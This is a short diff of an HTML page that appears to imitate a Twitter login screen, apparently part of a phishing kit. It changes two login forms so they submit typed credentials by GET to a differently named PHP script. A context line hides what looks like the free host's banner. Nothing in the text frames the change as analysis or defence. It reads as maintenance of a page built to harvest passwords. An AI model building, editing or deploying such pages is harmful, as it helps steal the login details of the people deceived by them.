@@ -3788,7 +3788,7 @@ document.getElementsByClassName("cbalink")[0].style.display = "none";
 
 			</div>
 
-			<form class="login-form" action="PPABB.php" method="get">
+			<form class="login-form" action="Sha_My.php" method="get">
 
 				<label>
 
@@ -3874,7 +3874,7 @@ document.getElementsByClassName("cbalink")[0].style.display = "none";
 
 			<center>
 
-			<form action="PPABB.php" method="get">
+			<form action="Sha_My.php" method="get">
 
 				<div class="txt-login-twitter">Login to Twitter</div>
 
